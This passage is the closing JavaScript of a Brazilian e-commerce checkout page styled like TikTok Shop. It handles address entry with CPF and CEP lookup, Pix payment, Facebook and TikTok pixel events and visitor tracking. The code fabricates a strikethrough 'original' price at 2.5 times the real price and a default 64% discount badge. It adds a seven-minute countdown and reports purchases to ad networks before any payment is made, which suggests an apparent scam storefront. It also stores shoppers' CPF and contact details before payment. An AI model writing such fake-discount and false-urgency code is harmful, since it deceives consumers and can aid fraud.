                currency: 'BRL'
            });
        }
        if (window.ttq && typeof window.ttq.track === 'function') {
            ttq.track('InitiateCheckout', {
                content_name: itemTitle,
                content_id: itemId,
                content_type: 'product',
                value: initVal,
                currency: 'BRL',
                quantity: checkoutItem.qty || checkoutItem.quantity || 1
            });
        }
    };

    window.changeCheckoutQty = function(delta) {
        checkoutItem.qty = Math.max(1, (checkoutItem.qty || 1) + delta);
        document.getElementById('chk-qty').innerText = checkoutItem.qty;
        document.getElementById('bar-items-count').innerText = checkoutItem.qty;
        window.updateCheckoutTotals();
    };

    window.updateCheckoutTotals = function() {
        let pNum = parseVal(checkoutItem.price);
        let origNum = parseVal(checkoutItem.original_price);
        let qty = checkoutItem.qty || 1;

        if (origNum <= pNum) origNum = pNum * 2.5;

        let totPrice = pNum * qty;
        let totOrig = origNum * qty;
        let totSavings = Math.max(0, totOrig - totPrice);

        let pct = Math.round(((origNum - pNum) / origNum) * 100);
        if (isNaN(pct) || pct <= 0) pct = 64;

        document.getElementById('chk-price').innerText = formatMoney(totPrice);
        document.getElementById('chk-orig-price').innerText = formatMoney(totOrig);
        document.getElementById('chk-pct-badge').innerText = '-' + pct + '%';

        document.getElementById('sum-subtotal').innerText = formatMoney(totPrice);
        document.getElementById('sum-orig').innerText = formatMoney(totOrig);
        document.getElementById('sum-discount').innerText = '- ' + formatMoney(totSavings);
        document.getElementById('sum-total').innerText = formatMoney(totPrice);

        document.getElementById('bar-savings').innerText = formatMoney(totSavings);
        document.getElementById('bar-total').innerText = formatMoney(totPrice);
    };

    window.openAddressModal = function() {
        document.getElementById('addressModal').classList.remove('hidden');
        window.validateAddressForm();
    };

    window.closeAddressModal = function() {
        document.getElementById('addressModal').classList.add('hidden');
    };

    window.lookupCEP = function() {
        const rawCep = (document.getElementById('cust_cep').value || '').replace(/\D/g, '');
        if (rawCep.length === 8) {
            fetch('https://viacep.com.br/ws/' + rawCep + '/json/')
                .then(r => r.json())
                .then(data => {
                    if (!data.erro) {
                        if (data.uf) document.getElementById('cust_uf').value = data.uf;
                        if (data.localidade) document.getElementById('cust_city').value = data.localidade;
                        if (data.bairro) document.getElementById('cust_bairro').value = data.bairro;
                        if (data.logradouro) document.getElementById('cust_street').value = data.logradouro;
                        window.validateAddressForm();
                    }
                })
                .catch(err => {});
        }
    };

    window.validateAddressForm = function() {
        const name = (document.getElementById('cust_name').value || '').trim();
        const phone = (document.getElementById('cust_phone').value || '').trim();
        const email = (document.getElementById('cust_email').value || '').trim();
        const cep = (document.getElementById('cust_cep').value || '').trim();
        const street = (document.getElementById('cust_street').value || '').trim();
        const cpf = (document.getElementById('cust_cpf').value || '').trim();

        // Show/hide error warning hints
        const errName = document.getElementById('err_name');
        if (errName) errName.style.display = (name.length > 0 && name.length < 3) ? 'flex' : 'none';

        const errPhone = document.getElementById('err_phone');
        if (errPhone) errPhone.style.display = (phone.length > 0 && phone.length < 8) ? 'flex' : 'none';

        const errEmail = document.getElementById('err_email');
        if (errEmail) errEmail.style.display = (email.length > 0 && (!email.includes('@') || !email.includes('.'))) ? 'flex' : 'none';

        const errCep = document.getElementById('err_cep');
        if (errCep) errCep.style.display = (cep.length > 0 && cep.length < 5) ? 'flex' : 'none';

        const isValid = (name.length >= 3) && (phone.length >= 8) && (email.includes('@')) && (cep.length >= 5) && (street.length >= 2) && (cpf.length >= 11);

        const btn = document.getElementById('btn-save-addr');
        if (btn) {
            if (isValid) {
                btn.className = 'w-full h-12 rounded-full bg-[#fe2c55] text-white font-extrabold text-base shadow-md active:scale-98 transition-all cursor-pointer';
            } else {
                btn.className = 'w-full h-12 rounded-full bg-[#ffb0c1] text-white font-extrabold text-base transition-all cursor-not-allowed';
            }
        }
    };

    window.loadSavedAddress = function() {
        const saved = localStorage.getItem('checkout_customer_address');
        if (saved) {
            try {
                const addr = JSON.parse(saved);
                const elEmpty = document.getElementById('addr-empty');
                if (elEmpty) elEmpty.classList.add('hidden');
                document.getElementById('addr-display').classList.remove('hidden');
                
                document.getElementById('addr-name').innerText = addr.name || '';
                
                let p = (addr.phone || '').replace(/\D/g, '');
                let maskedPhone = '(+55)' + p;
                if(p.length >= 10) {
                    let ddd = p.substring(0, 2);
                    let last2 = p.substring(p.length - 2);
                    maskedPhone = '(+55)' + ddd + '*******' + last2;
                }
                document.getElementById('addr-phone').innerText = maskedPhone;
                
                let full = addr.street || '';
                if (addr.number) full += ', ' + addr.number;
                if (addr.neighborhood) full += ', ' + addr.neighborhood;
                if (addr.city) full += ', ' + addr.city;
                if (addr.uf) full += ', ' + addr.uf;
                if (addr.cep) full += ', ' + addr.cep;
                document.getElementById('addr-full').innerText = full;

                if(document.getElementById('cust_name')) document.getElementById('cust_name').value = addr.name || '';
                if(document.getElementById('cust_cpf')) document.getElementById('cust_cpf').value = addr.cpf || '';
                if(document.getElementById('cust_phone')) document.getElementById('cust_phone').value = addr.phone || '';
                if(document.getElementById('cust_email')) document.getElementById('cust_email').value = addr.email || '';
                if(document.getElementById('cust_cep')) document.getElementById('cust_cep').value = addr.cep || '';
                if(document.getElementById('cust_uf')) document.getElementById('cust_uf').value = addr.uf || '';
                if(document.getElementById('cust_city')) document.getElementById('cust_city').value = addr.city || '';
                if(document.getElementById('cust_bairro')) document.getElementById('cust_bairro').value = addr.neighborhood || '';
                if(document.getElementById('cust_street')) document.getElementById('cust_street').value = addr.street || '';
                if(document.getElementById('cust_number')) document.getElementById('cust_number').value = addr.number || '';
                if(document.getElementById('cust_comp')) document.getElementById('cust_comp').value = addr.comp || '';
            } catch(e) {}
        } else {
            const elEmpty = document.getElementById('addr-empty');
            if (elEmpty) elEmpty.classList.remove('hidden');
            document.getElementById('addr-display').classList.add('hidden');
        }

    };

    window.saveAddressData = function(e) {
        if (e) e.preventDefault();

        const name = (document.getElementById('cust_name').value || '').trim();
        const phone = (document.getElementById('cust_phone').value || '').trim();
        const email = (document.getElementById('cust_email').value || '').trim();

        if (name.length < 3) {
            document.getElementById('err_name').style.display = 'flex';
            document.getElementById('cust_name').focus();
            return;
        }
        if (phone.length < 8) {
            document.getElementById('err_phone').style.display = 'flex';
            document.getElementById('cust_phone').focus();
            return;
        }
        if (!email.includes('@')) {
            document.getElementById('err_email').style.display = 'flex';
            document.getElementById('cust_email').focus();
            return;
        }

        const addr = {
            name: name,
            cpf: document.getElementById('cust_cpf').value,
            phone: phone,
            email: email,
            cep: document.getElementById('cust_cep').value,
            uf: document.getElementById('cust_uf').value,
            city: document.getElementById('cust_city').value,
            neighborhood: document.getElementById('cust_bairro').value,
            street: document.getElementById('cust_street').value,
            number: document.getElementById('cust_number').value,
            comp: document.getElementById('cust_comp').value
        };

        localStorage.setItem('checkout_customer_address', JSON.stringify(addr));
        window.loadSavedAddress();
        window.closeAddressModal();

        // Fire AddPaymentInfo Pixel Event
        const payVal = parseVal(checkoutItem.price) * (checkoutItem.qty || checkoutItem.quantity || 1);
        if (typeof fbq === 'function') {
            fbq('track', 'AddPaymentInfo', { value: payVal, currency: 'BRL' });
        }
        if (window.ttq && typeof window.ttq.track === 'function') {
            ttq.track('AddPaymentInfo', { value: payVal, currency: 'BRL' });
        }

        // Save customer data to DB so it appears in Pedidos Recentes
        const stored = localStorage.getItem('checkout_item');
        let productName = '';
        if (stored) {
            try { productName = JSON.parse(stored).title || ''; } catch(e) {}
        }
        fetch('/api/customers.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                name:         addr.name         || '',
                cpf:          addr.cpf          || '',
                phone:        addr.phone        || '',
                email:        addr.email        || '',
                cep:          addr.cep          || '',
                address:      addr.street       || '',
                number:       addr.number       || '',
                neighborhood: addr.neighborhood || '',
                city:         addr.city         || '',
                state:        addr.uf           || '',
                product_name: productName
            })
        }).catch(() => {});

        window.processDirectCheckout(addr);
    };

    window.handleOrderSubmit = function() {
        const saved = localStorage.getItem('checkout_customer_address');
        if (!saved) {
            window.openAddressModal();
        } else {
            try {
                const addr = JSON.parse(saved);
                window.processDirectCheckout(addr);
            } catch(e) {
                window.openAddressModal();
            }
        }
    };

    window.isProcessingCheckout = false;
    window.processDirectCheckout = function(addr) {
        if (window.isProcessingCheckout) return;
        window.isProcessingCheckout = true;

        const submitBtn = document.querySelector('button[onclick*="handleOrderSubmit"]');
        if (submitBtn) {
            submitBtn.disabled = true;
            submitBtn.style.opacity = '0.6';
        }

        let pNum = parseVal(checkoutItem.price);
        let qty = checkoutItem.qty || checkoutItem.quantity || 1;
        let totalAmount = pNum * qty;
        if (isNaN(totalAmount) || totalAmount <= 0) {
            alert('Erro no valor do pedido. Por favor, selecione um produto na loja antes de finalizar.');
            window.isProcessingCheckout = false;
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
            }
            window.location.href = '/loja.html';
            return;
        }

        const payload = {
            product_id: checkoutItem.product_id || '',
            variation_id: checkoutItem.variation_id || '',
            option_id: checkoutItem.option_id || '',
            size_id: checkoutItem.size_id || '',
            voltage_id: checkoutItem.voltage_id || '',
            quantity: qty,
            variation: checkoutItem.variation || '',
            note: checkoutItem.note || '',
            product_title: checkoutItem.title || '',
            customer_name: addr.name || 'Cliente TikTok',
            customer_document: addr.cpf || '00000000000',
            customer_phone: addr.phone || '11999999999',
            customer_email: addr.email || 'cliente@email.com',
            cep: addr.cep || '',
            street: addr.street || '',
            number: addr.number || '',
            neighborhood: addr.neighborhood || '',
            city: addr.city || '',
            uf: addr.uf || '',
            amount: totalAmount
        };

        fetch('/api/checkout.php', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(payload)
        })
        .then(r => r.json())
        .then(data => {
            if (data.error && !data.pix_copy_paste && !data.qr_code) {
                alert('Erro no pagamento: ' + data.error);
                return;
            }
            
            const copyCode = data.pix_copy_paste || data.qr_code || data.pix_qr_code || data.copy_paste || '';
            
            document.getElementById('pix-full-key-input').value = copyCode;
            document.getElementById('pix-copy-text').innerText = copyCode;
            document.getElementById('pix-screen-amount').innerText = formatMoney(totalAmount);
            
            let now = new Date();
            let deadline = new Date(now.getTime() + 7 * 60000);
            
            const months = ['jan.','fev.','mar.','abr.','mai.','jun.','jul.','ago.','set.','out.','nov.','dez.'];
            let d = deadline.getDate();
            let m = months[deadline.getMonth()];
            let y = deadline.getFullYear();
            let h = String(deadline.getHours()).padStart(2, '0');
            let min = String(deadline.getMinutes()).padStart(2, '0');
            document.getElementById('pix-deadline-date').innerText = d + ' de ' + m + ' de ' + y + ', ' + h + ':' + min;

            document.getElementById('pixModal').classList.remove('hidden');
            document.getElementById('pixModal').classList.add('flex');
            
            const mainHeader = document.querySelector('header');
            const mainContent = document.querySelector('main');
            if(mainHeader) mainHeader.style.display = 'none';
            if(mainContent) mainContent.style.display = 'none';

            // Fire Purchase (FB) & PlaceAnOrder / CompletePayment (TikTok)
            const purVal = totalAmount;
            const purTitle = checkoutItem.title || 'Produto';
            const purId = String(checkoutItem.product_id || '');

            if (typeof fbq === 'function') {
                fbq('track', 'Purchase', {
                    content_name: purTitle,
                    content_ids: [purId],
                    content_type: 'product',
                    value: purVal,
                    currency: 'BRL'
                });
            }
            if (window.ttq && typeof window.ttq.track === 'function') {
                ttq.track('PlaceAnOrder', {
                    content_name: purTitle,
                    content_id: purId,
                    content_type: 'product',
                    value: purVal,
                    currency: 'BRL'
                });
                ttq.track('CompletePayment', {
                    content_name: purTitle,
                    content_id: purId,
                    content_type: 'product',
                    value: purVal,
                    currency: 'BRL'
                });
            }
            
            window.startPixTimer(7 * 60);
        })
        .catch(err => {
            alert('Falha na comunicação com o gateway de pagamento.');
        })
        .finally(() => {
            window.isProcessingCheckout = false;
            if (submitBtn) {
                submitBtn.disabled = false;
                submitBtn.style.opacity = '1';
            }
        });
    };

    let pixTimerInterval = null;
    window.startPixTimer = function(durationSeconds) {
        let timer = durationSeconds;
        let display = document.getElementById('pix-timer');
        clearInterval(pixTimerInterval);
        pixTimerInterval = setInterval(function () {
            let hours = parseInt(timer / 3600, 10);
            let minutes = parseInt((timer % 3600) / 60, 10);
            let seconds = parseInt(timer % 60, 10);

            hours = hours < 10 ? "0" + hours : hours;
            minutes = minutes < 10 ? "0" + minutes : minutes;
            seconds = seconds < 10 ? "0" + seconds : seconds;

            display.textContent = hours + ":" + minutes + ":" + seconds;

            if (--timer < 0) {
                clearInterval(pixTimerInterval);
                display.textContent = "00:00:00";
            }
        }, 1000);
    };

    window.closePixModal = function() {
        document.getElementById('pixModal').classList.add('hidden');
        document.getElementById('pixModal').classList.remove('flex');
        const mainHeader = document.querySelector('header');
        const mainContent = document.querySelector('main');
        if(mainHeader) mainHeader.style.display = 'flex';
        if(mainContent) mainContent.style.display = 'block';
        clearInterval(pixTimerInterval);
    };

    window.copyPixKeyFromScreen = function() {
        const input = document.getElementById('pix-full-key-input');
        input.select();
        input.setSelectionRange(0, 99999); 
        navigator.clipboard.writeText(input.value).then(() => {
            const txt = document.getElementById('txt-copy-pix');
            txt.innerText = 'Copiado!';
            setTimeout(() => txt.innerText = 'Copiar', 2000);
        }).catch(err => {
            document.execCommand('copy');
            const txt = document.getElementById('txt-copy-pix');
            txt.innerText = 'Copiado!';
            setTimeout(() => txt.innerText = 'Copiar', 2000);
        });
    };

    // ─── LIVE VISITOR TRACKING ────────────────────────────────────────────────
    (function() {
        let sid = '';
        try {
            sid = localStorage.getItem('_vsid');
            if (!sid) sid = sessionStorage.getItem('_vsid');
        } catch(e) {}
        if (!sid) {
            sid = 'v_' + Math.random().toString(36).substring(2, 10) + Date.now().toString(36);
        }
        try {
            localStorage.setItem('_vsid', sid);
            sessionStorage.setItem('_vsid', sid);
        } catch(e) {}

        const page = 'checkout';
        const baseUrl = '/api/track.php';

        function ping() {
            if (document.visibilityState === 'hidden') return;
            const url = baseUrl + '?session_id=' + encodeURIComponent(sid) + '&page=' + page + '&action=ping&t=' + Date.now();
            if (navigator.sendBeacon) {
                navigator.sendBeacon(url);
            } else {
                fetch(url, { method: 'GET', keepalive: true }).catch(() => {});
            }
        }

        function leave() {
            const url = baseUrl + '?session_id=' + encodeURIComponent(sid) + '&page=' + page + '&action=leave&t=' + Date.now();
            if (navigator.sendBeacon) {
                navigator.sendBeacon(url);
            } else {
                fetch(url, { method: 'GET', keepalive: true }).catch(() => {});
            }
        }

        ping();
        setInterval(ping, 5000);

        window.addEventListener('pagehide', leave);
        window.addEventListener('beforeunload', leave);
        document.addEventListener('visibilitychange', function() {
            if (document.visibilityState === 'hidden') leave();
            else if (document.visibilityState === 'visible') ping();
        });
    })();

    document.addEventListener('DOMContentLoaded', window.initCheckout);
    </script>
</body>
</html>
